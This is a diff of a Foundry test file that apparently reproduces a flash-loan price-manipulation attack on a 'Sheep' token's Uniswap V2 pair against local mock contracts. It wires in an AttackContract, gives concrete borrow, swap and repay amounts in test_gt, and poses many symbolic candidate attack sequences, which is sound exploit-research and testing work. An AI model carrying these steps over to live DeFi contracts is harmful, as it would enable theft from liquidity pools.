@@ -1,5 +1,6 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
+import "./AttackContract.sol";
 import "./Sheep.sol";
 import "@utils/QueryBlockchain.sol";
 import "forge-std/Test.sol";
@@ -14,13 +15,15 @@ contract SheepTest is Test, BlockLoader {
     UniswapV2Pair pair;
     UniswapV2Factory factory;
     UniswapV2Router router;
+    AttackContract attackContract;
+    address owner;
     address attacker;
-    address owner = address(0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266);
     address sheepAddr;
     address wbnbAddr;
     address pairAddr;
     address factoryAddr;
     address routerAddr;
+    address attackContractAddr;
     uint256 blockTimestamp = 1676025497;
     uint112 reserve0pair = 30014300506936992470;
     uint112 reserve1pair = 38470984903412245858;
@@ -40,9 +43,7 @@ contract SheepTest is Test, BlockLoader {
     uint256 balanceOfwbnb = 48486432013583908291;
 
     function setUp() public {
-        vm.warp(blockTimestamp);
-        attacker = address(this);
-        vm.startPrank(owner);
+        owner = address(this);
         sheep = new Sheep(
             "Sheep",
             "Sheep",
@@ -77,12 +78,14 @@ contract SheepTest is Test, BlockLoader {
         factoryAddr = address(factory);
         router = new UniswapV2Router(address(factory), address(0xdead));
         routerAddr = address(router);
+        attackContract = new AttackContract();
+        attackContractAddr = address(attackContract);
+        attacker = address(attackContract);
         // Initialize balances and mock flashloan.
         wbnb.transfer(address(pair), balanceOfwbnbpair);
         sheep.transfer(address(pair), balanceOfsheeppair);
         wbnb.approve(attacker, UINT256_MAX);
         sheep.approve(attacker, UINT256_MAX);
-        vm.stopPrank();
     }
 
     function printBalance(string memory tips) public {
@@ -123,9 +126,17 @@ contract SheepTest is Test, BlockLoader {
             sheep.decimals()
         );
         emit log_string("");
-        emit log_string("Attacker Balances: ");
-        queryERC20BalanceDecimals(address(wbnb), attacker, wbnb.decimals());
-        queryERC20BalanceDecimals(address(sheep), attacker, sheep.decimals());
+        emit log_string("Attackcontract Balances: ");
+        queryERC20BalanceDecimals(
+            address(wbnb),
+            address(attackContract),
+            wbnb.decimals()
+        );
+        queryERC20BalanceDecimals(
+            address(sheep),
+            address(attackContract),
+            sheep.decimals()
+        );
         emit log_string("");
         emit log_string("");
         emit log_string("");
@@ -192,6 +203,7 @@ contract SheepTest is Test, BlockLoader {
     }
 
     function test_gt() public {
+        vm.startPrank(attacker);
         borrow_wbnb(38000e15);
         printBalance("After step0 ");
         swap_pair_wbnb_sheep(wbnb.balanceOf(attacker));
@@ -205,6 +217,7 @@ contract SheepTest is Test, BlockLoader {
         payback_wbnb(38114e15);
         printBalance("After step5 ");
         require(attackGoal(), "Attack failed!");
+        vm.stopPrank();
     }
 
     function check_gt(
@@ -214,6 +227,7 @@ contract SheepTest is Test, BlockLoader {
         uint256 amt3,
         uint256 amt4
     ) public {
+        vm.startPrank(attacker);
         vm.assume(amt4 == (amt0 * 1003) / 1000);
         borrow_wbnb(amt0);
         swap_pair_wbnb_sheep(amt1);
@@ -222,6 +236,7 @@ contract SheepTest is Test, BlockLoader {
         swap_pair_sheep_wbnb(amt3);
         payback_wbnb(amt4);
         assert(!attackGoal());
+        vm.stopPrank();
     }
 
     function check_cand000(
@@ -231,6 +246,7 @@ contract SheepTest is Test, BlockLoader {
         uint256 amt3,
         uint256 amt4
     ) public {
+        vm.startPrank(attacker);
         vm.assume(amt4 == (amt0 * 1003) / 1000);
         borrow_wbnb(amt0);
         swap_pair_wbnb_sheep(amt1);
@@ -238,6 +254,7 @@ contract SheepTest is Test, BlockLoader {
         swap_pair_sheep_wbnb(amt3);
         payback_wbnb(amt4);
         assert(!attackGoal());
+        vm.stopPrank();
     }
 
     function check_cand001(
@@ -248,6 +265,7 @@ contract SheepTest is Test, BlockLoader {
         uint256 amt4,
         uint256 amt5
     ) public {
+        vm.startPrank(attacker);
         vm.assume(amt5 == (amt0 * 1003) / 1000);
         borrow_wbnb(amt0);
         swap_pair_wbnb_sheep(amt1);
@@ -256,6 +274,7 @@ contract SheepTest is Test, BlockLoader {
         swap_pair_sheep_wbnb(amt4);
         payback_wbnb(amt5);
         assert(!attackGoal());
+        vm.stopPrank();
     }
 
     function check_cand002(
@@ -265,6 +284,7 @@ contract SheepTest is Test, BlockLoader {
         uint256 amt3,
         uint256 amt4
     ) public {
+        vm.startPrank(attacker);
         vm.assume(amt4 == (amt0 * 1003) / 1000);
         borrow_wbnb(amt0);
         swap_pair_wbnb_sheep(amt1);
@@ -273,6 +293,7 @@ contract SheepTest is Test, BlockLoader {
         swap_pair_sheep_wbnb(amt3);
         payback_wbnb(amt4);
         assert(!attackGoal());
+        vm.stopPrank();
     }
 
     function check_cand003(
@@ -283,6 +304,7 @@ contract SheepTest is Test, BlockLoader {
         uint256 amt4,
         uint256 amt5
     ) public {
+        vm.startPrank(attacker);
         vm.assume(amt5 == (amt0 * 1003) / 1000);
         borrow_wbnb(amt0);
         swap_pair_wbnb_sheep(amt1);
@@ -291,6 +313,7 @@ contract SheepTest is Test, BlockLoader {
         swap_pair_sheep_wbnb(amt4);
         payback_wbnb(amt5);
         assert(!attackGoal());
+        vm.stopPrank();
     }
 
     function check_cand004(
@@ -301,6 +324,7 @@ contract SheepTest is Test, BlockLoader {
         uint256 amt4,
         uint256 amt5
     ) public {
+        vm.startPrank(attacker);
         vm.assume(amt5 == (amt0 * 1003) / 1000);
         borrow_wbnb(amt0);
         swap_pair_wbnb_sheep(amt1);
@@ -310,6 +334,7 @@ contract SheepTest is Test, BlockLoader {
         swap_pair_sheep_wbnb(amt4);
         payback_wbnb(amt5);
         assert(!attackGoal());
+        vm.stopPrank();
     }
 
     function check_cand005(
@@ -321,6 +346,7 @@ contract SheepTest is Test, BlockLoader {
         uint256 amt5,
         uint256 amt6
     ) public {
+        vm.startPrank(attacker);
         vm.assume(amt6 == (amt0 * 1003) / 1000);
         borrow_wbnb(amt0);
         swap_pair_wbnb_sheep(amt1);
@@ -330,6 +356,7 @@ contract SheepTest is Test, BlockLoader {
         swap_pair_sheep_wbnb(amt5);
         payback_wbnb(amt6);
         assert(!attackGoal());
+        vm.stopPrank();
     }
 
     function check_cand006(
@@ -340,6 +367,7 @@ contract SheepTest is Test, BlockLoader {
         uint256 amt4,
         uint256 amt5
     ) public {
+        vm.startPrank(attacker);
         vm.assume(amt5 == (amt0 * 1003) / 1000);
         borrow_wbnb(amt0);
         swap_pair_wbnb_sheep(amt1);
@@ -349,6 +377,7 @@ contract SheepTest is Test, BlockLoader {
         swap_pair_sheep_wbnb(amt4);
         payback_wbnb(amt5);
         assert(!attackGoal());
+        vm.stopPrank();
     }
 
     function check_cand007(
@@ -360,6 +389,7 @@ contract SheepTest is Test, BlockLoader {
         uint256 amt5,
         uint256 amt6
     ) public {
+        vm.startPrank(attacker);
         vm.assume(amt6 == (amt0 * 1003) / 1000);
         borrow_wbnb(amt0);
         swap_pair_wbnb_sheep(amt1);
@@ -369,6 +399,7 @@ contract SheepTest is Test, BlockLoader {
         swap_pair_sheep_wbnb(amt5);
         payback_wbnb(amt6);
         assert(!attackGoal());
+        vm.stopPrank();
     }
 
     function check_cand008(
@@ -380,6 +411,7 @@ contract SheepTest is Test, BlockLoader {
         uint256 amt5,
         uint256 amt6
     ) public {
+        vm.startPrank(attacker);
         vm.assume(amt6 == (amt0 * 1003) / 1000);
         borrow_wbnb(amt0);
         swap_pair_wbnb_sheep(amt1);
@@ -390,6 +422,7 @@ contract SheepTest is Test, BlockLoader {
         swap_pair_sheep_wbnb(amt5);
         payback_wbnb(amt6);
         assert(!attackGoal());
+        vm.stopPrank();
     }
 
     function check_cand009(
@@ -402,6 +435,7 @@ contract SheepTest is Test, BlockLoader {
         uint256 amt6,
         uint256 amt7
     ) public {
+        vm.startPrank(attacker);
         vm.assume(amt7 == (amt0 * 1003) / 1000);
         borrow_wbnb(amt0);
         swap_pair_wbnb_sheep(amt1);
@@ -412,6 +446,7 @@ contract SheepTest is Test, BlockLoader {
         swap_pair_sheep_wbnb(amt6);
         payback_wbnb(amt7);
         assert(!attackGoal());
+        vm.stopPrank();
     }
 
     function check_cand010(
@@ -423,6 +458,7 @@ contract SheepTest is Test, BlockLoader {
         uint256 amt5,
         uint256 amt6
     ) public {
+        vm.startPrank(attacker);
         vm.assume(amt6 == (amt0 * 1003) / 1000);
         borrow_wbnb(amt0);
         swap_pair_wbnb_sheep(amt1);
@@ -433,6 +469,7 @@ contract SheepTest is Test, BlockLoader {
         swap_pair_sheep_wbnb(amt5);
         payback_wbnb(amt6);
         assert(!attackGoal());
+        vm.stopPrank();
     }
 
     function check_cand011(
@@ -445,6 +482,7 @@ contract SheepTest is Test, BlockLoader {
         uint256 amt6,
         uint256 amt7
     ) public {
+        vm.startPrank(attacker);
         vm.assume(amt7 == (amt0 * 1003) / 1000);
         borrow_wbnb(amt0);
         swap_pair_wbnb_sheep(amt1);
@@ -455,6 +493,7 @@ contract SheepTest is Test, BlockLoader {
         swap_pair_sheep_wbnb(amt6);
         payback_wbnb(amt7);
         assert(!attackGoal());
+        vm.stopPrank();
     }
 
     function check_cand012(
@@ -467,6 +506,7 @@ contract SheepTest is Test, BlockLoader {
         uint256 amt6,
         uint256 amt7
     ) public {
+        vm.startPrank(attacker);
         vm.assume(amt7 == (amt0 * 1003) / 1000);
         borrow_wbnb(amt0);
         swap_pair_wbnb_sheep(amt1);
@@ -478,6 +518,7 @@ contract SheepTest is Test, BlockLoader {
         swap_pair_sheep_wbnb(amt6);
         payback_wbnb(amt7);
         assert(!attackGoal());
+        vm.stopPrank();
     }
 
     function check_cand013(
@@ -491,6 +532,7 @@ contract SheepTest is Test, BlockLoader {
         uint256 amt7,
         uint256 amt8
     ) public {
+        vm.startPrank(attacker);
         vm.assume(amt8 == (amt0 * 1003) / 1000);
         borrow_wbnb(amt0);
         swap_pair_wbnb_sheep(amt1);
@@ -502,6 +544,7 @@ contract SheepTest is Test, BlockLoader {
         swap_pair_sheep_wbnb(amt7);
         payback_wbnb(amt8);
         assert(!attackGoal());
+        vm.stopPrank();
     }
 
     function check_cand014(
@@ -514,6 +557,7 @@ contract SheepTest is Test, BlockLoader {
         uint256 amt6,
         uint256 amt7
     ) public {
+        vm.startPrank(attacker);
         vm.assume(amt7 == (amt0 * 1003) / 1000);
         borrow_wbnb(amt0);
         swap_pair_wbnb_sheep(amt1);
@@ -525,6 +569,7 @@ contract SheepTest is Test, BlockLoader {
         swap_pair_sheep_wbnb(amt6);
         payback_wbnb(amt7);
         assert(!attackGoal());
+        vm.stopPrank();
     }
 
     function check_cand015(
@@ -538,6 +583,7 @@ contract SheepTest is Test, BlockLoader {
         uint256 amt7,
         uint256 amt8
     ) public {
+        vm.startPrank(attacker);
         vm.assume(amt8 == (amt0 * 1003) / 1000);
         borrow_wbnb(amt0);
         swap_pair_wbnb_sheep(amt1);
@@ -550,5 +596,6 @@ contract SheepTest is Test, BlockLoader {
         swap_pair_sheep_wbnb(amt7);
         payback_wbnb(amt8);
         assert(!attackGoal());
+        vm.stopPrank();
     }
 }
